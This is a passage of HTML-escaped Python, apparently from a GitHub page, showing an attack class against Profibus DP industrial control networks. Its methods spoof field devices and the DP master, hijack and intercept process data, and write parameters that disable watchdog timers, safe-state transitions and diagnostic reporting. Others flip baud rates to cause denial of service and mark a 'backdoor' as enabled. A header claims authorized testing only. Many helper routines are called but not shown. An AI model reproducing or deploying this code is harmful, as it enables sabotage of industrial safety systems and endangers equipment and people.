CRITICAL INDUSTRIAL PROTOCOL SECURITY NOTICE: This class demonstrates Profibus DP\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        protocol exploitation for authorized industrial control system security testing ONLY.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        AUTHORIZED USE CASES:\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e monitoring and intrusion detection system development\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        STRICT class=\"pl-s1\"\u003eidentity\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# Phase 4: Announce spoofed device on Profibus network\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003eannouncement_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eannounce_profibus_device\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-c\"\u003e# Phase 5: Hijack communications to redirect traffic\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eannouncement_success\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003ehijack_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehijack_profibus_communication\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e)\n                \u003cspan class=\"pl-s1\"\u003espoofing_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'address'\u003c/span\u003e]] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'original_device'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eidentity\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'spoofed_device'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'announcement_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eannouncement_success\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'hijack_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ehijack_success\u003c/span\u003e\n                }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003espoofing_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eprofibus_parameter_manipulation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute Profibus DP parameter manipulation attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Modifies critical device parameters to disable safety features and enable malicious behavior.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Critical parameters to manipulate for attack persistence\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003emalicious_parameters\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'watchdog_time'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0xFFFF\u003c/span\u003e,      \u003cspan class=\"pl-c\"\u003e# Disable watchdog timer monitoring\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'safe_state'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0000\u003c/span\u003e,         \u003cspan class=\"pl-c\"\u003e# Disable automatic safe state transition\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'process_data'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0xDEAD\u003c/span\u003e,       \u003cspan class=\"pl-c\"\u003e# Inject malicious process data pattern\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'diagnostic_interval'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0000\u003c/span\u003e, \u003cspan class=\"pl-c\"\u003e# Disable diagnostic reporting\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'baud_rate'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0C00\u003c/span\u003e,          \u003cspan class=\"pl-c\"\u003e# Manipulate communication speed\u003c/span\u003e\n            \u003cspan class=\"pl-s\"\u003e'slot_time'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0xFFFF\u003c/span\u003e,          \u003cspan class=\"pl-c\"\u003e# Maximum slot time for timing attacks\u003c/span\u003e\n        }\n        \n        \u003cspan class=\"pl-s1\"\u003emanipulation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emalicious_parameters\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eitems\u003c/span\u003e():\n            \u003cspan class=\"pl-s1\"\u003ewrite_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ewrite_profibus_parameter\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003everification\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003everify_parameter_change\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e)\n            \n            \u003cspan class=\"pl-s1\"\u003emanipulation_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                \u003cspan class=\"pl-s\"\u003e'write_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ewrite_success\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'verification'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003everification\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'original_value'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_original_parameter\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e),\n                \u003cspan class=\"pl-s\"\u003e'new_value'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e\n            }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emanipulation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eprofibus_baud_rate_attack\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute Profibus baud rate manipulation attack.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Changes network communication speed to cause desynchronization and denial of service.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Discover current network baud rate\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ecurrent_baud\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edetect_profibus_baud_rate\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Malicious baud rates to disrupt communication\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003edisruptive_bauds\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-c1\"\u003e9300\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e187500\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e1500000\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e3000000\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e6000000\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e12000000\u003c/span\u003e]\n        \n        \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emalicious_baud\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edisruptive_bauds\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003emalicious_baud\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ecurrent_baud\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003echange_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eset_profibus_baud_rate\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003emalicious_baud\u003c/span\u003e)\n                \u003cspan class=\"pl-s1\"\u003edisruption_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eassess_communication_disruption\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e)\n                \n                \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e[\u003cspan class=\"pl-s1\"\u003emalicious_baud\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'change_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003echange_success\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'original_baud'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ecurrent_baud\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'disruption_level'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edisruption_level\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'recovery_required'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edisruption_level\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0.5\u003c/span\u003e\n                }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eattack_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eprofibus_master_spoofing\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute Profibus master station spoofing attack.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Impersonates the Profibus DP master to take control of network communications.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Identify legitimate master station\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003elegitimate_master\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eidentify_profibus_master\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Extract master identity and parameters\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003emaster_identity\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextract_master_identity\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003elegitimate_master\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Create spoofed master with enhanced privileges\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003espoofed_master\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecreate_master_spoof\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003emaster_identity\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Take over master functionality\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003etakeover_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'token_capture'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecapture_profibus_token\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'slave_enumeration'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eenumerate_slaves_as_master\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'parameter_control'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003econtrol_slave_parameters\u003c/span\u003e(),\n            \u003cspan class=\"pl-s\"\u003e'data_exchange_hijack'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ehijack_data_exchange\u003c/span\u003e()\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etakeover_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003escan_profibus_network\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Comprehensive Profibus network scanning and device enumeration.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Identifies all active devices, their addresses, and basic characteristics.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[*] Scanning Profibus network: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003etarget_network\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003ediscovered_devices\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e []\n        \n        \u003cspan class=\"pl-c\"\u003e# Scan standard Profibus DP address range (0-125)\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eaddress\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-en\"\u003erange\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e, \u003cspan class=\"pl-c1\"\u003e126\u003c/span\u003e):\n            \u003cspan class=\"pl-s1\"\u003edevice_info\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eprobe_profibus_device\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eaddress\u003c/span\u003e)\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003edevice_info\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003ediscovered_devices\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eappend\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice_info\u003c/span\u003e)\n                \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003ef\"[+] Discovered Profibus device: Address \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eaddress\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e, Type: \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003edevice_info\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eget\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'device_type'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'Unknown'\u003c/span\u003e)\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-c\"\u003e# Build network topology map\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003enetwork_topology\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebuild_topology_map\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003ediscovered_devices\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ediscovered_devices\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eextract_profibus_identity\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Extract complete device identity for spoofing purposes.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Gathers device identification, parameters, and operational characteristics.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eidentity\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'device_address'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'address'\u003c/span\u003e],\n            \u003cspan class=\"pl-s\"\u003e'device_type'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eget\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'device_type'\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'manufacturer_id'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_device_manufacturer\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'device_id'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_device_identification\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'device_profile'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_device_profile\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'parameters'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_all_device_parameters\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'diagnostic_capabilities'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eread_diagnostic_capabilities\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eidentity\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ecreate_profibus_spoof\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eoriginal_identity\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Create malicious spoofed device based on original device identity.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Modifies parameters to enable attack capabilities while maintaining appearance.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003espoofed_identity\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eoriginal_identity\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecopy\u003c/span\u003e()\n        \n        \u003cspan class=\"pl-c\"\u003e# Modify parameters for malicious functionality\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003espoofed_identity\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eupdate\u003c/span\u003e({\n            \u003cspan class=\"pl-s\"\u003e'malicious_modifications'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'watchdog_disabled'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'safe_state_override'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'diagnostic_suppression'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'backdoor_enabled'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003eTrue\u003c/span\u003e\n            },\n            \u003cspan class=\"pl-s\"\u003e'modified_parameters'\u003c/span\u003e: {\n                \u003cspan class=\"pl-s\"\u003e'watchdog_time'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0xFFFF\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'safe_state'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0000\u003c/span\u003e,\n                \u003cspan class=\"pl-s\"\u003e'diagnostic_interval'\u003c/span\u003e: \u003cspan class=\"pl-c1\"\u003e0x0000\u003c/span\u003e\n            },\n            \u003cspan class=\"pl-s\"\u003e'spoofed_address'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_spoof_address\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eoriginal_identity\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'device_address'\u003c/span\u003e]),\n            \u003cspan class=\"pl-s\"\u003e'attack_capabilities'\u003c/span\u003e: [\u003cspan class=\"pl-s\"\u003e'parameter_manipulation'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'data_injection'\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'communication_hijack'\u003c/span\u003e]\n        })\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003espoofed_identity\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehijack_profibus_communication\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eoriginal_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Hijack Profibus communications by redirecting traffic to spoofed device.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Implements man-in-the-middle between master and original device.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-c\"\u003e# Redirect master communications to spoofed device\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eredirection_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eredirect_master_communications\u003c/span\u003e(\n            \u003cspan class=\"pl-s1\"\u003eoriginal_device\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'device_address'\u003c/span\u003e], \n            \u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'spoofed_address'\u003c/span\u003e]\n        )\n        \n        \u003cspan class=\"pl-c\"\u003e# Intercept and modify process data\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003einterception_capability\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eenable_process_data_interception\u003c/span\u003e(\n            \u003cspan class=\"pl-s1\"\u003eoriginal_device\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'device_address'\u003c/span\u003e]\n        )\n        \n        \u003cspan class=\"pl-c\"\u003e# Establish persistent communication control\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003epersistence\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestablish_communication_persistence\u003c/span\u003e(\n            \u003cspan class=\"pl-s1\"\u003espoofed_device\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'spoofed_address'\u003c/span\u003e]\n        )\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'redirection_success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eredirection_success\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'interception_capability'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003einterception_capability\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'persistence_established'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003epersistence\u003c/span\u003e\n        }\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ewrite_profibus_parameter\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003etarget_device\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eparameter\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evalue\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Write malicious parameter value to target Profibus device.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Bypasses parameter validation and safety 